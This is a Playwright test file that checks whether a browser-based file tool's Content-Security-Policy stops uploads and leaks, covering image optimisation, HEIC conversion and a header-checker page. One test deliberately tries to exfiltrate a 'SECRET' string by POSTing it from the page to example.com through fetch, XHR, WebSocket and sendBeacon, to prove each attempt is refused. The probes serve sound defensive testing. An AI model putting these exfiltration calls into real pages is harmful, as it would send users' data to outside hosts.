import { readFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { expect, test } from '@playwright/test';

import { useOriginOf, watchOffOrigin } from './egress-watch';
import { setFilesWhenLive } from './upload';

/**
 * The egress proof, as something that runs rather than something asserted.
 *
 * The product's loudest claim is that files are processed in the tab and are
 * not uploaded. Business rule 23 says that claim ships only for a build that
 * passed "the current egress proof protocol" — but `ai/KNOWN_ISSUES.md` records
 * that protocol as "not empirically complete", and `implementation/ARCHITECTURE.md`
 * says that because of it "the UI says proof is pending". The UI did not say
 * pending: it shipped `zero cloud uploads` and `zero data leaks`.
 *
 * This file closes that gap the only way it can be closed — by measuring the
 * built artifact, in both engines Playwright runs, on every release. Three
 * things are checked, in order of how much they prove:
 *
 *   1. The policy is present and restrictive (cheap, and catches a regression
 *      in the header before anything else has to run).
 *   2. Deliberate exfiltration is refused. Five vectors are actively attempted
 *      from the page's own context. This proves the control works, which
 *      observing an idle page never can.
 *   3. A real file goes through a real tool and nothing carrying it leaves.
 *
 * One trap worth knowing, found the hard way against production: **a blocked
 * `navigator.sendBeacon` still returns `true`.** The spec returns true once the
 * beacon is queued, and CSP refuses it after. Anything asserting on that return
 * value records a leak as a pass. Assert on observed network, never on a return.
 */

/**
 * The detector moved to `./egress-watch` when `egress-sweep.spec.ts` needed the
 * same one across every route. The reasoning for each assertion's shape lives
 * there now, unchanged; two copies of a leak detector is how one of them
 * quietly stops detecting.
 */
test.beforeEach(({ baseURL }) => {
  useOriginOf(baseURL);
});

test.describe('egress proof', () => {
  test('the served policy forbids network connections', async ({ request }) => {
    const response = await request.get('/image/optimize');
    expect(response.status()).toBe(200);
    const csp = response.headers()['content-security-policy'] ?? '';

    // connect-src is the one that matters: it governs fetch, XHR, WebSocket,
    // EventSource and sendBeacon together. 'none' means the page cannot open a
    // data connection at all, enforced by the browser rather than by our code.
    expect(csp).toContain("connect-src 'none'");
    // The rest close the paths that could carry bytes out without connect-src.
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
  });

  test('every attempt to send data out is refused', async ({ page }) => {
    const watcher = watchOffOrigin(page);

    await page.goto('/image/optimize');

    const results = await page.evaluate(async () => {
      const out: Record<string, string> = {};
      const probe = async (name: string, fn: () => unknown) => {
        try {
          out[name] = `ALLOWED: ${String(await fn()).slice(0, 60)}`;
        } catch (error) {
          out[name] = `blocked: ${(error as Error).name}`;
        }
      };

      await probe(
        'fetch.crossOrigin',
        async () =>
          (
            await fetch('https://example.com/x', {
              method: 'POST',
              body: 'SECRET',
            })
          ).status,
      );
      await probe(
        'fetch.sameOrigin',
        async () =>
          (await fetch('/collect', { method: 'POST', body: 'SECRET' })).status,
      );
      await probe(
        'xhr.crossOrigin',
        () =>
          new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://example.com/x');
            xhr.onload = () => resolve(xhr.status);
            xhr.onerror = () => reject(new Error('refused'));
            xhr.send('SECRET');
          }),
      );
      await probe(
        'websocket',
        () =>
          new Promise((resolve, reject) => {
            let socket: WebSocket;
            try {
              socket = new WebSocket('wss://example.com/s');
            } catch (error) {
              return reject(error as Error);
            }
            socket.onopen = () => resolve('open');
            socket.onerror = () => reject(new Error('refused'));
            setTimeout(() => reject(new Error('never opened')), 3_000);
          }),
      );
      // Deliberately NOT asserted on its return value — see the note at the top.
      navigator.sendBeacon('https://example.com/b', 'SECRET');
      return out;
    });

    for (const [vector, result] of Object.entries(results)) {
      expect(result, `${vector} was not refused`).toMatch(/^blocked:/u);
    }

    // The beacon is judged here, on the wire, where its return value cannot lie.
    await page.waitForTimeout(1_000);
    watcher.assertNothingLeft('deliberate exfiltration');
    await watcher.assertZeroBytesOffOrigin(page);
  });

  test('a real file goes through a real tool without leaving the device', async ({
    page,
  }) => {
    const watcher = watchOffOrigin(page);
    const withBody: string[] = [];
    page.on('request', (req) => {
      // A GET for a script or stylesheet cannot carry a file. Anything with a
      // body, or any method that implies one, can.
      if (req.method() !== 'GET' || req.postData()) {
        withBody.push(`${req.method()} ${req.url()}`);
      }
    });

    await page.goto('/image/optimize');
    // Hydration must finish before the file is handed over. Assigning
    // `input.files` and firing `change` at markup React has not attached to
    // yet is silently discarded when it hydrates, and the button then stays
    // disabled forever — which reads as "the tool is broken" when the tool is
    // fine. Locally the race is invisible because load is instant; over a real
    // network against the deployed site it loses every time.
    await page.waitForLoadState('networkidle');

    // A real PNG, built in the page, handed over exactly as a file picker would.
    // The filename is distinctive so it can be searched for in every URL below.
    const probeName = 'egress-probe-7f3a9c2b.png';
    await page.evaluate(async (name) => {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const context = canvas.getContext('2d')!;
      const gradient = context.createLinearGradient(0, 0, 320, 240);
      gradient.addColorStop(0, '#1B6B47');
      gradient.addColorStop(1, '#9E4527');
      context.fillStyle = gradient;
      context.fillRect(0, 0, 320, 240);
      context.fillStyle = '#ffffff';
      context.font = '20px monospace';
      context.fillText('EGRESSPROBE-7f3a9c2b', 14, 120);

      const blob = await new Promise<Blob | null>((resolve) =>
        canvas.toBlob(resolve, 'image/png'),
      );
      const file = new File([await blob!.arrayBuffer()], name, {
        type: 'image/png',
      });
      const transfer = new DataTransfer();
      transfer.items.add(file);
      const input =
        document.querySelector<HTMLInputElement>('input[type=file]')!;
      input.files = transfer.files;
      input.dispatchEvent(new Event('change', { bubbles: true }));
    }, probeName);

    const optimise = page.getByRole('button', { name: /optimi[sz]e image/iu });
    // Assert the handover registered before clicking, so a failure here reads
    // "the file never reached the tool" rather than "a click timed out".
    await expect(optimise).toBeEnabled({ timeout: 15_000 });
    await optimise.click();

    // The tool is done when it offers the result for saving.
    await expect(
      page.locator('[data-receipt-download], a[download]').first(),
    ).toBeVisible({
      timeout: 30_000,
    });

    watcher.assertNothingLeft('real file operation');
    await watcher.assertZeroBytesOffOrigin(page);
    expect(withBody, 'the page sent a request with a body').toEqual([]);

    // Nothing the browser fetched may name the file, which is what a leak
    // through an img or script URL would look like under this policy.
    const leakedInUrl = await page.evaluate(
      (name) =>
        performance
          .getEntriesByType('resource')
          .map((entry) => entry.name)
          .filter((url) => url.includes(name) || url.includes('EGRESSPROBE')),
      probeName,
    );
    expect(leakedInUrl, 'the filename appeared in a request URL').toEqual([]);

    // Nothing capable of carrying a body ran at all during the operation.
    const sendingInitiators = await page.evaluate(() =>
      [
        ...new Set(
          performance
            .getEntriesByType('resource')
            .map((entry) => (entry as PerformanceResourceTiming).initiatorType),
        ),
      ].filter((type) =>
        ['fetch', 'xmlhttprequest', 'beacon', 'websocket'].includes(type),
      ),
    );
    expect(sendingInitiators, 'a data-sending request ran').toEqual([]);
  });
  /**
   * The checker is held to the standard it reports on.
   *
   * `/proof/check` asks a visitor to paste a page address and a set of response
   * headers, and then tells them whether *that* page can transmit what they
   * give it. The first question any reader should ask is the obvious one: does
   * this page send what I paste into it anywhere?
   *
   * A tool that measured other people's egress while leaking its own input
   * would be worse than not shipping one, so the answer cannot be a paragraph
   * of copy on the page. It is this test, run in both engines on every
   * release, against the built artifact.
   *
   * The probe token goes into both inputs and is then searched for in every
   * request URL — the same check the sweep runs on a filename, because a
   * same-origin `<img src="/og.png?q=...">` is permitted by `default-src
   * 'self'` and is a real exfiltration shape.
   *
   * It also asserts the verdict actually rendered. Without that, a page that
   * failed to hydrate would pass every leak assertion by doing nothing at all,
   * which is precisely the vacuous detector this protocol keeps catching in
   * itself.
   */
  test('the checker does not transmit the address or headers pasted into it', async ({
    page,
    request,
  }) => {
    const response = await request.get('/proof/check');
    expect(response.status()).toBe(200);
    const csp = response.headers()['content-security-policy'] ?? '';
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("form-action 'none'");

    const watcher = watchOffOrigin(page);
    const withBody: string[] = [];
    page.on('request', (sent) => {
      if (sent.method() !== 'GET' || sent.postData())
        withBody.push(`${sent.method()} ${sent.url()}`);
    });

    await page.goto('/proof/check');
    await page.waitForLoadState('networkidle');

    /*
     * Distinctive enough to find anywhere, and present in neither the source
     * nor any fixture, so a match can only have come from what was typed.
     *
     * Lowercase on purpose. `new URL()` lowercases a hostname, so an uppercase
     * token goes into the box in one case and comes out of the page in
     * another -- which would make the visible assertion fail (it did) and,
     * worse, would make a case-sensitive scan of request URLs miss the
     * normalised form. The scans below are case-insensitive for the same
     * reason: a leak that arrived re-cased is still a leak.
     */
    const token = 'egressprobe-c41d8f7b';

    await page
      .getByLabel('Page address')
      .fill(`https://${token}.example/upload`);
    await page
      .getByLabel('Paste response headers, or a content-security-policy')
      .fill(`content-security-policy: default-src 'self'; connect-src 'none'; report-uri /${token}`);

    /*
     * The tool must have actually answered. A blank page leaks nothing either,
     * so without this the whole test would pass on a page that failed to
     * hydrate.
     *
     * Scoped to the verdict card rather than the document: the snippet this
     * page hands out quotes its own title and the address that was typed, so
     * an unscoped match finds the textarea as well and cannot tell a rendered
     * verdict from a copy of the instructions.
     */
    const verdict = page.locator('figure');
    await expect(verdict).toBeVisible({ timeout: 15_000 });
    await expect(verdict).toContainText('Cannot send your file anywhere');
    await expect(verdict).toContainText(`${token}.example`);

    watcher.assertNothingLeft('the egress checker');
    await watcher.assertZeroBytesOffOrigin(page);
    watcher.assertNothingCarriedAFile('the egress checker', token);
    expect(withBody, 'the checker sent a request with a body').toEqual([]);

    const leakedInUrl = await page.evaluate(
      (probe) =>
        performance
          .getEntriesByType('resource')
          .map((entry) => entry.name)
          .filter((url) =>
            decodeURIComponent(url).toLowerCase().includes(probe),
          ),
      token,
    );
    expect(
      leakedInUrl,
      'what was pasted appeared in a request URL',
    ).toEqual([]);
  });

  /**
   * The HEIC pages hold the site's one relaxation of `connect-src`, so they are
   * the one place where "no connections at all" is not the proof. What has to
   * be true here is narrower and more useful: the origin is the only thing
   * reachable, the photograph itself never enters a request, and the request
   * the page does make carries no body.
   */
  test('the HEIC page reaches this origin and nothing else, and the photo stays', async ({
    page,
    request,
  }) => {
    const response = await request.get('/image/heic-to-jpg');
    expect(response.status()).toBe(200);
    const csp = response.headers()['content-security-policy'] ?? '';
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toContain("connect-src 'none'");
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain('wasm-unsafe-eval');

    const watcher = watchOffOrigin(page);
    const withBody: string[] = [];
    page.on('request', (sent) => {
      if (sent.postData()) withBody.push(sent.url());
    });

    const heic = await readFile(
      path.join(
        path.dirname(fileURLToPath(import.meta.url)),
        '..',
        'lib',
        'tools',
        'image-convert',
        '__fixtures__',
        'blocks-64.heic',
      ),
    );
    await page.goto('/image/heic-to-jpg');
    await setFilesWhenLive(
      page.locator('input[type="file"]'),
      [{ name: 'EGRESSPROBE-photo.heic', mimeType: 'image/heic', buffer: heic }],
      page.getByRole('link', { name: /save jpeg/iu }),
    );
    await expect(page.getByRole('link', { name: /save jpeg/iu })).toBeVisible({
      timeout: 60_000,
    });

    watcher.assertNothingLeft('HEIC conversion');
    await watcher.assertZeroBytesOffOrigin(page);
    expect(withBody, 'the page sent a request with a body').toEqual([]);

    const leakedInUrl = await page.evaluate(() =>
      performance
        .getEntriesByType('resource')
        .map((entry) => entry.name)
        .filter((url) => url.includes('EGRESSPROBE')),
    );
    expect(leakedInUrl, 'the filename appeared in a request URL').toEqual([]);
  });
});
